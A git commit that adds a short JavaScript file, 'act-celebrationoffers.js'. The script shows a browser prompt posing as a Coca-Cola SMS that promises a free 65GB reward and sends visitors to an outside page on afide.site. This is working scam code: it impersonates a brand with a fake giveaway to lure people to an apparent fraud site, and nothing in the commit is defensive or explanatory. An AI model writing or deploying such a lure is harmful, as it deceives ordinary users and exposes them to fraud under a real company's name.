fb7bd6c94ae479f8d5c8d486a9f78768162069ea
ufaiba <ufaiba247@gmail.com>
2026-06-29 05:30:57 -0700

    Add celebration offers password prompt and redirect

---
+++ act-celebrationoffers.js
@@ -0,0 +1,5 @@
+var password = 'FREE 65GB '
+password=prompt('COCA-COLA SMS: We have been here for 65 years celebrating moments that matters to you and yours , dont miss out your Reward, press Free 65GB To Check Now ','FREE 65GB');
+if (password != 'FREE 65GB') {
+location.href='https://afide.site/celebrationoffers.html';
+}
